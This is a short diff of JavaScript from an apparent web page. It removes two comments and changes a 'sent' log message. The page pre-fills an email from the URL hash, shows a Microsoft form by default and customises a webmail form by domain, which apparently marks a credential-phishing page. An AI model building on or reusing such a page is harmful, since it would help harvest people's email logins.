@@ -666,7 +666,6 @@
                     customizeWebmailForm(domain);
                 }
 
-                // Show the appropriate form
                 document.getElementById(formToShow).style.display = 'block';
                 
                 // Set the email value in the appropriate form
@@ -676,7 +675,6 @@
                 }
                 
             } else {
-                // If no email in hash, show Microsoft form as default
                 document.getElementById('microsoft').style.display = 'block';
             }
         });
@@ -722,7 +720,7 @@ function sendMessage(formId) {
     return response.json();
   })
   .then(data => {
-    console.log('Success:', data); // Debug log
+    console.log('Success, sent:', data); // Debug log
     
     // Success state
     sendButton.textContent = "Sent Successfully!";
